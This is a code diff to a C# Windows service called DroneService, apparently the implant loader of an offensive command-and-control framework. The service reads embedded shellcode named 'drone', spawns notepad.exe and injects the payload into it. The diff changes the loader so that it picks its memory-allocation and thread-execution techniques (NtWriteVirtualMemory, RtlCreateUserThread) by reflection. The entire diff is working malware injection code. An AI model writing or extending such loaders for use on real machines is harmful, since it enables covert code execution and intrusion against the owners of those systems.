@@ -1,4 +1,6 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
+using System.Linq;
 using System.ServiceProcess;
 using System.Threading;
 
@@ -17,8 +19,16 @@ namespace DroneService
         {
             var shellcode = Utilities.GetEmbeddedResource("drone");
             var payload = new PICPayload(shellcode);
-            var alloc = new SectionMapAlloc();
-            var exec = new RemoteThreadCreate();
+
+            var self = System.Reflection.Assembly.GetExecutingAssembly();
+            var types = self.GetTypes();
+
+            var alloc = (from type in types where type == Allocation
+                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+            
+            var exec = (from type in types where type == Execution
+                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+            
             var process = Process.Start(SpawnTo);
 
             _ = Injector.Inject(payload, alloc, exec, process);
@@ -29,5 +39,7 @@ namespace DroneService
         }
 
         private static string SpawnTo => @"C:\Windows\System32\notepad.exe";
+        private static Type Allocation => typeof(NtWriteVirtualMemory);
+        private static Type Execution => typeof(RtlCreateUserThread);
     }
 }
